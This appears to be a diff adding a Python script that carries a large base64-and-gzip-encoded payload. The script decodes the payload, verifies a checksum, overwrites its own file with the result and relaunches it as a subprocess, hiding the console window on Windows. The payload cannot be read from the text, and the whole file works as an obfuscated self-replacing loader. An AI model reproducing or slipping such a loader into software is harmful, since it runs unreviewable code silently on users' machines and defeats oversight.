@@ -1,0 +1,20 @@
+I6QdqGHhVZ70w3SHlxmX0ZWFi6KxiIXy7KWly/t0RscVzeNCtjiZwECbWAKJKlmA0JbhY15cCxp5qljv0DFySRPyKnmrEUzHb8Gi+1BRrDdfs9vKskYQXMnhJhczmDz0At66Ujrn1pmuJX5Ot9bWsFK1pKXlIBxoFQcBF1yKmm5Sz0Qjd6VUKSWT4b/of66sY/pVPDc4YfCvkkinwaxLK6Qh8XSKcUtagWE0nxn5c8aARrCkQGMoJbdKnjWLrqDHuo8TXnaPsNSd96rZy0WXEtHlEuHegLzz2WMN27ugM2UcUfaq6ipPeMKlkX1zDX5ZBbo9xT3qrIiSrtFMcDfljuKXbjSdAm5NKH+FqzrtM706vyAE/63nbFEKmlwJCiHCcl31RSVgYFk1G4/67h6JvFg5Nwvpe3c1kAHzdfiluwKsWuxoRr0uaGUmKwBpBeBdupavulNvDh6+c08TeVKpuU1NJ/RSnnc7q10CQt6mbX26p86t49sutssA1i8evAJsSLJ+clV4larXO8/7BRXH02FWUc64tnNooAXokNaUuICbz0AAgAjvdp4Xw4DtbMLAXW7DgHcAo1UEQ27hUTBITFjpZs+jZfqpWgYSNQsDItKMHCxMb+6eIEU6rGlCwpKDgm/dYIKRP41TIAOUBJJufy6vXZVfuzJqGZDLPdGkY5I8wHD4BcmmmM4ixcz8gcZoHrAQ45tHEoaSqRd2ZmGhvljUtnvpzz57VIly6TSW1yDRhSbzk6b5k/nAzFLq4INDPF418rd8aJ+dd067P3VPjg+Ozs9q5vnDCC9qqz56FNSOre/nAGPImdV8QRbr4in4QF/ET+jtRXlf0SyfXh4vfT2DeKU76nH7iFyXxEa+5/mjGwqtazYa9Yb43jHSTRvqI8cJJAB7t1Nje2ASCTVwz7A9HaE3twDVUfxnv38JgshNCJL8f5ZO3u9Yvke5hOaJ4mfG0wCv/yHBBNRCDRjbunv+dDPxpyDngVJJeWk/hXisEcfogVXXjrpuVNiG1GC59SX6LcfYBzeuRIhUP0tiig5f/19v19KaQAyE7/0V0pMLRWzBS2EPomuR+gDR9lBksNaKoFZUKqX0vzczk2weO1nrpdedSWaym02+zCut4WDA+YhJtMHb4qgAu1PR91sRXu5v76am3KEZAe/fSnF2J7oD8/4j5vqjihRY+K/qiXBXUg0TOilU+5L3F8qV1lY+DwBWxjPgwvnUDjUpaf2+O9h9WGiv6LwXh1PJ0vWbiqA3cqYBuTYkMTkZNoefyuZQkOMylEvaq61ouV1R6sAmMqr1jG4gcRlFqQLfOeF8vDsnOecqE5szlctUK0Ts6xuSPHPoABsiUt5lNYl8ljK6WM++Fmh9EECt3qg9jnhPnPBR0pHHEPRDmUfkH3YxAr2/nCS/NUueFsu8aqxkew9BIaeE5/SEcoyjLhBHIl9jbk8+ocJMT4oHISoMkSIGXG0wV0gnyiCmAiJW5cmR030YyP35wwqwHbEkvjlfrKmL8/RTX3kSWhmZdnnparccL570ncW0Ne4+ZQzXuXP+O4adznW0D1dFY0Eo4ABylouCSUEh6HiZTrrwMMqyQaiOet6fqLW+2OjVNoJ2c/QotBx3e9lNrKIvhhaIVnXBbYGxwSmlCtXI5ucY42ZkgMiDJ/l7Ak/E+R50Z1TNoB5UrTgpXEbtFYhs1Orx+xY9n3+BqSCM7uY9BUuVU12/kVfXP3KNJyo5qU5SJsQHeXV4oklfw3uI00pzt6tyTKE11W6NIcVzAyj+Ui+AQw/cF27Ff/MN6JmClMePuZr91899aGe9bJzZyyGMGonlxxEh4sNOlEZAl/wAUP49AFIBdP49D/7qF+sWWNuH3AEA"""
+
+def main():
+    target = Path(__file__).resolve()
+    raw = gzip.decompress(base64.b64decode(_PAYLOAD.encode("ascii")))
+    actual = hashlib.sha256(raw).hexdigest()
+    if actual != _PAYLOAD_SHA256:
+        raise RuntimeError("v5.5 payload checksum mismatch")
+
+    tmp = target.with_suffix(".v55.tmp")
+    tmp.write_bytes(raw)
+    os.replace(tmp, target)
+
+    kwargs = {"cwd": str(target.parent)}
+    if os.name == "nt":
+        kwargs["creationflags"] = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
+    subprocess.Popen([sys.executable, str(target)], **kwargs)
+
+if __name__ == "__main__":
+    main()
